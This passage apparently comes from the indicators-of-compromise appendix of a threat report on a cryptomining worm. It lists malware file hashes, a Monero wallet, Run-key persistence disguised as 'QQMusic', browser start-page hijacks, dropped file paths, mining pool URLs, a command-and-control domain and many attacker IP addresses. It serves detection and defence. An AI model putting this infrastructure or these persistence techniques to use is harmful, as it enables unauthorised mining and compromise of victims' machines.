                "50f329e034db96ba254328cd1e0f588af6126c341ed92ddf4aeb96bc76835937 dmgd-4.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "19690e5b862042d9011dbdd92504f5012c08d51efca36828a5e9bdfe27d88842 esco-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3fcffe9eae90ec365efb361674613ac95de50b2ccfd634c24491923f85c309a5 etch-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe4640fefa4bef02041a771a206f9184adb38de051f0d8726c4579736fe13bb6 etchCore-0.x64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3596e8fa5e19e860a2029fa4ab7a4f95fadf073feb88e4f82b19a093e1e2737c etchCore-0.x86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7ddbade1f4fcb48f254e7defa1ab5ec568e8ff0403693860b76870e11816aee6 eteb-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8a5cce25f1bf60e716709c724b96630b95e55cc0e488d74d60ea50ffba7d6946 etebCore-2.x64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "609ed51631da2defa34d58f60dc2a0f38e1574d8cf07647b844fc8b95de4bd8c",
                "etebCore-2.x86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "15292172a83f2e7f07114693ab92753ed32311dfba7d54fe36cc7229136874d9 exma-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c977ac10aa3d2250a1af39630f532184a5185f505bcd5f03ea7083a3a701a969 exma.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b1d48e8185d9d366dce8c723ba765d6c593b7873cb43d77335084b58bbc7cb4d iconv.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d3c6985d965cad5bff6075677ed8c2cafee4c3a048fb5af81b442665c76dff7b libcurl.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5f30aa2fe338191b972705412b8043b0a134cdb287d754771fc225f2309e82ee libeay32.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "36b0fa6c0da7434707e7e330f40316458c0c1edc39b80e2fe58745cd77955eb3 libiconv-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aceb27720115a63b9d47e737fd878a61c52435ea4ec86ba8e58ee744bc85c4f3 libxml2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "df9200ba0d967487b9eb9627078d7faa88072c493b6d9e2b68211c14b06e9f4e pcla-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "17d6dde8a6715b9311734cb557b76160a22e340785b3950eae23aae67b0af6a8 pcre-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "93f0a1fe486ad222b742e451f25f4c9219b1e0f5b4273a15ce08dd714827745a pcrecpp-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1c8100aca288483d5c29dcf33df887e72513f9b1cb6d0c96045401981351307c pcreposix-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cde45f7ff05f52b7215e4b0ea1f2f42ad9b42031e16a3be9772aa09e014bacdb posh-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47e16f7db53d9adf24d193ff4d523b1bc7ae59ff8520cfa012365bdb947c96f9 posh.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f8ee4c00a3a53206d8d37abe5ed9f4bfc210a188cd5b819d3e1f77b34504061e riar-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "55039ab48c0916a38f1ceee08ba9f9cf5f292064cf3ee6631f22becde5e74b2d riar.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13 serverlong.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a46481cdb4a9fc1dbdcccc49c3deadbf18c7b9f274a0eb5fdf73766a03f19a7f serverlong.fb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf33a92a05ba3c807447a5f6b7e45577ed53174699241da360876d4f4a2eb2de serverlong.xml"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "be8eb97d8171b8c91c6bc420346f7a6d2d2f76809a667ade03c990feffadaad5 ssleay32.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "85b936960fbe5100c170b777e1647ce9f0f01e3ab9742dfc23f37cb0825b30b5 svchostlong.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ad3c0b153d5b5ba4627daa89cd2adbb18ee5831cb67feeb7394c51ebc1660f41 svchostlong.fb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "756f44f1d667132b043bfd3da16b91c9f6681e5d778c5f07bb031d62ff00d380 svchostlong.xml"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b svchostromance.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6c55b736646135c0acbad702fde64574a0a55a77be3f39287774c7e518de3da9 svchostromance.xml"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "52e88433f2106cc9a3a961cd8c3d0a8939d8de28f2ef3ee8ea648534a8b036a4 tibe-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ca63dbb99d9da431bf23aca80dc787df67bb01104fb9358a7813ed2fce479362 tibe-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a418edc5f1fb14fbf9398051225f649810fa75514ca473610be44264bf3c663c tibe.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6775d627d99733f3f02494db7e13935b505132f43c56e7f8850c54e6627691de trch-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0259d41720f7084716a3b2bbe34ac6d3021224420f81a4e839b0b3401e5ef29f trch-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "06c031f0d905cdeb0d9c172c27ae0c2d25bbf0d08db27a4aa98ec540a15306e7 trch.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a4c460b27d03daf7828f6b6db87e0ff3ee851fdb1b8654b0a778b4c34953a3dc trfo-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b2a3172a1d676f00a62df376d8da805714553bb3221a8426f9823a8a5887daaa trfo-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "96edea8d08ab10eee86776cfb9e32b4701096d21c39dbffeb49bd638f09d726a trfo.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf25bdc6711a72713d80a4a860df724a79042be210930dcbfc522da72b39bb12 tucl-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "36107f74be98f15a45ff716e37dad70f1ff9515bc72a0a1ec583b803c220aa92 tucl.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f0df80978b3a563077def7ba919e2f49e5883d24176e6b3371a8eef1efe2b06a ucl.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b7d8fcc3fb533e5e0069e00bc5a68551479e54a990bb1b658e1bd092c0507d68 xdvl-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "70dbb0b5562cd034c6b70a4a86a346b0f0039acf1b09f5814c42895963e12ea0 zibe.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aa8adf96fc5a7e249a6a487faaf0ed3e00c40259fdae11d4caf47a24a9d3aaed zlib1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mutex"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\Sessions\\1\\BaseNamedObjects\\122.112.179.189"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4AfAd5hsdMWbuNyGbFJVZjcMLeKHvrXnT155DWh8qGkYRPbVGKBT9q1Z5gcFXqmwUuh2Kh6t2sTnHXPysYrGf2m9KqBwz9e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr - %stratum info%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Deleted Registry Key"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\RealVNC\\vncviewer\\KnownHosts"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\RealVNC\\vncviewer\\MRU"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\spread.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\index.html"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\spreadXfghij.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\SMB.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\svchostlong.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%TEMP%\\\\<4-random-lower-case-characters>.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Deleted Files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\Windows\\\\SysWOW64\\\\rserver30\\\\Radm_log.htm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "121[.]206[.]143[.]140"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1. stratum+tcp://pool.supportxmr.com:8080"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2. stratum+tcp://gulf.moneroocean.stream:10001"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qf2020[.]top:19370"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "66d619ca5e848ce0e4bcb1252ff8a4f0a060197a94810de85873c76fa3826c1e spread.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "84b0f2e4d222b0a2e34224e60b66340071e0d03c5f1a2af53b6005a3d739915f LNK encrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4c729b343ed3186dffdf80a8e3adfea7c2d56a7a06081333030fb4635e09d540",
                "LNK decrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f2d9d7703a5983ae3b7767c33ae79de1db093ea30f97d6b16bb5b62f03e99638 SMB encrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5214f356f2e8640230e93a95633cd73945c38027b23e76bb5e617c71949f8994 SMB decrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4365c2ba5505afeab2c479a9c546ed3cbc07ace184fe5019947823018feb4265 X64 encrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ac530d542a755ecce6a656ea6309717ec222c34d7e34c61792f3b350a8a29301 X64 decrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b6d4b4ef2880238dc8e322c7438f57b69cec6d44c0599875466a1edb8d093e15",
                "X86 encrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8edbcd63def33827bfd63bffce4a15ba83e88908f9ac9962f10431f571ba07a8 X86 decrypted"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Same as version 1>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "478021e127232f6c6bad31b342486c88d58ab299e6c1336bbf3da00f3c38f1c8 CJqsRymyTEMnBoEC_T.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "42e1a05ab55d4a209d6198454718e6aaf0ac63b1778ccfc648b7791d06eddc44 DNfOzAatoSkUAZpM_E.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5d181f72ca116b2925151416d5cc6d8f7ab29242be9030ec927e7175c764f56f FNqWxGJfjXHWtsOf_S.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "00f49b9f5e2d0156017dd5421c9301cf62b0a023d45f36455cf1d287c7f061cb FavqRrpXeqruoJwm_M.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5c75ac1a0f824cb3b14a84b5b2dba0a52ed150e2e410850eafa08338dd596198 LdhMQIbWZpcSeVNj_Z.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe9f693a81ceed943854896543406edd1a6e4c2ee6a84abf196659fc8617f22e LqFWHUlZTWlULatC_G.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8b4b3f131d70922502e61e7ef294f69916d289f72fe3dcccca7e2ebb904de018 MkGTeIIFLYOjZclX_I.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d690b048e3984f9f8305ba0d3fb4eeea490a1461796b6927a31d0beffdafbc8b NfMIupIogETQsWra_V.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d05609b368bc35d4795cc220ef42ea06d9ac8284e49b218c64789876ccdacb2e OuWZjtdbLqFVMSLF.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "52da4c4c3ac7237ee803a5aa3250d9ca1b571876d46d725135079a866b4a554d QZwHXICgEbiMtEwe_S.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3a3344f89ce8c459c11b7d480db274e8ea438cacedfe60332b1b2b65e82dfab1 QjcZPYwkZKEVQvgs_W.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "64af944e3ca7dec9a5673df3043d24064351de33a6ecc61ad2d288956a570bff SAmbRRbbdmzXwBQm_J.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0be5db462b912cc4207e47c7fe0a80153e1f15a327a486fb2ba3e0c1efa2978a SDtTgoPxAguJyxBw_T.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "686eb63c8b5c07040f22e6fee0cc76baabe283fcffc0926df1bf3b802aeb8cfe TFjoAQJOJqTTlynz_W.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "39e8a25b0875e2ba1906b83b2d0c2cfd0762a5f1a670e6d736cc3873125b807c TeNENqdfbnkTNers_O.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2dfd7a838abcf46e420e418af04413ba53cc5592ec18b8a6fe35cab161baeb48 TpzgiaCNXaSnzlKx_K.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ab0c0471fd57e3ed03bbb5c5e4564c3843d62d0b7b88a15a18cd2d057a22a9f6 TywZFloXXLcMoUVP_P.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ab8511ed01a0601e974809c8f3f92094ebf6669679228ce6daea6027ab59e554 VhfYGmTcCCcrfTaY_Y.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "32d18553602309c19b5f88a1761bc1598f346124915c2c38e1129b7c5cf94a42 WmOXSshkpQfaLVED.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0a4d0fb773e9251bd420e3998605500881bca21119d7af44f06b002de2cdc8fe YSfBenPxsQHppZuM_E.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ab9e4c3c4827896a309a16b289e97ae848113590c8db2a62b931833ab83d9099 ZMLUEPWbhtajeFvU_F.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5ae7d87b81db21da2b6212ff1229264093b5954f2d6ffb273420f898141c611d aQRlCerEgjVIRYLQ_N.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d29841ebebeb48fc3da7e23ce4a0a4d3e48c1602485e9fbe913cb2ff8eb9d0dd bzimVhTxVSVAvqWW_H.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b64712d39bd2ce26bb24f6cd5877554bee39240bd5994a1a6143bba660c34e2b cRTvZQMkUULYLGmW_F.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "02981319f54847a5587fc9cb4e32c54a76bdcfe583bc3059ee79a40c4a4409d7 emeDxGEdARUmzHYN_X.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b585e210997e38741c4842979472b38e704c187a11565e32d549d0aab181ad3a fXtYTHUBPuuoBWrl_P.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5def9f81ea8187a2716c77fe21a709b9c760762973fc3bbe62203e2b5897f1cc gBsceXqQIqhXHySi_N.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "74254df16012b0ffee18f02c96820e507b961cc6a7bcb5cc2a5f43064291d0a4 gXRyeJymkCbmiXIR_H.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b8a24d8aa9b936413be925091ff551a9e872c634e9aef28df0f19363645e1224 gyhbcKquCWLSOUSd_U.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "04d17a702b485ae343287239b0b6201ebcaea3dd24188579800d21a16f9b35c6",
                "gzTXwmTukBDryAPx_L.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc0997022f3b02556362ff87c59ba6db6751070aa7e73a42ac634af0eaab6ca5 hRAVeKFdQFfUWWqf_D.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7a08530d46fd2bd0e61cb5ebeae8a32b6020cda5555290d5e7d8b2838127d0f6 iWYfETBuIkffMlgp_Z.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b13cb42cb21efe404a88501e9ecca74f695b527a42934e62625ddf11fefcea9a joJczkptYQtfkMNm_J.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "57d1f4287e36c4b109afb797d50d693329d92e6d9ee69822242e55cac3c422f7 juHLixrdaEoaGDcL_I.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5e8bfc88a5643c40d6efd4462cd918573e9be6fd934222a0bccc64d3e789fdfc lHGRXkTVRihDzkjl_R.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "21167b8443213332b519140e364cf25043b2b9171ac8ab3ce4b591e62c3b5f89 lPfkoJiWxgsoSrsD_V.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7857ecefa14ab3d86a699700b313c85d6d3b106fe5375f5a5e938784271fb1dd laTnMsKakEOKsJHf_R.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6791024c02a9045b237f9bf09e2ca7a7e3503d81a59f4691e5442670be21b0c1 lvdfRmNKdkMexTNn_G.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8995c73fe107b3c4dad829db8e7a6b9b2bee29811d73909a9bf67ad5bd5acacb nChCLwgSBXaEiwIR_Q.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4a928ff8904640733cff08bd5f70e23ee2466cb8f925a1764e9ad61bbf006efd qIeuxAOnUEVJWOEe_K.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "18267b8425c9dbcf4de44b22c80712ac58ddff7e3fa54839252bd5337778859f rxTDIbsrdXcyLvYA_Y.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "24437f92578b3632452e1e9a97341c781d36dae544d4d6827e5831c71e0f34db sHEofvMNSNPGPxnI_X.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "782d840f3dc7f648f8404de3e4039882e05fcf8cd2cba1509136835f6cb547d0",
                "uZfBVEFQdlRgsvpT_D.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "437064714d5b080673fbdeae792a5376fbd8be361a6783a8bda78d944975f055 vnvlkoVTAEtCfPYX_Q.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c735098987b555b3aa3adb58e0691d9280c2b593307072d7d731e02cd338d7ac wDxKJhyBflVPXlwA_L.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "33c14ef70be64290bcd9bd5abc72f2e39f50bfa567c5f521ee5d3406deb80a93 xWiOFoWnpbAxeKSr_U.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3c9b80de476f842c4325580ab628ddebae4a7261ffaee52c3df0514a368d3c11 xXIRjCUwUvcECnmO_M.lnk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qf2020.top"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Added/Modified Registry Key Value"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr - %stratum info%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Internet",
                "Explorer\\MAIN\\Start Page - http://www[.]yzzswt[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Internet",
                "Explorer\\MAIN\\Start Page - http://www[.]yzzswt[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Same as version 1>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\spread.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\index.html"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\spreadXfghij.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\SMB.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\svchostlong.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%TEMP%\\\\<4-random-lower-case-characters>.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "K:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\spread.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "K:\\\\Users\\\\Administrator\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\spread.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%ROOT PATH%\\\\OuWZjtdbLqFVMSLF.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\CVE147159.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\CVE\\\\"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\Windows\\\\SysWOW64\\\\rserver30\\\\Radm_log.htm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\X64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "K:\\\\spread.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\ProgramData\\\\CVE147159.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\\\CVE\\\\"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.23.52"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91.121.140.167"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "149.202.83.171"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.99.124.170"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.187.95.110"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.247.226"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.99.125.38"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "18.180.72.219"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3.0.193.200"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.180.131.153"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.32.24.80"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "116.203.73.240"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "44.202.105.45"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "95.179.220.100"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.99.100.250"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "149.28.17.136"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.76.206.51"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "142.44.240.132"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.23.52"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.99.123.196"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.12.27"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "178.63.100.197"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "107.178.104.10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92.110.160.114"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.12.30"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.52.83"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "104.140.201.102"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "95.216.46.125"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3.253.40.188"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3.253.40.189"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.125.194.18"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.125.194.34"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78.47.158.234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.101.30.124"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "203.107.32.162"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.102.39.92"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.102.251.102"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.110.199.70"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.224.168.24"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.110.190.245"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.224.219.119"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.224.20.173"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "203.107.40.49"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "116.211.169.162"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "218.11.2.44"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "107.191.99.221"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "107.191.99.95"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3.112.214.88"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.241.2.137"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "206.189.33.65"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "161.117.192.8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47.244.176.59"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "210.1.226.51"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "116.203.61.78"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "35.163.175.186"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "178.128.107.204"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.77.31.97"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "172.104.91.217"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "103.101.30.10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.99.72.56"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "176.9.4.26"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "149.202.214.40"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.43.136"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.44.193"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.43.131"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88.99.242.92"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88.99.193.240"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.165.85"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.165.87"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91.121.2.76"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.54.205"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.55.60"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.44.93"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.187.154.79"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.45.174"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "176.9.53.68"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78.46.91.134"
            ]
        },
        {
            "type": "paragraph",
            "content": [
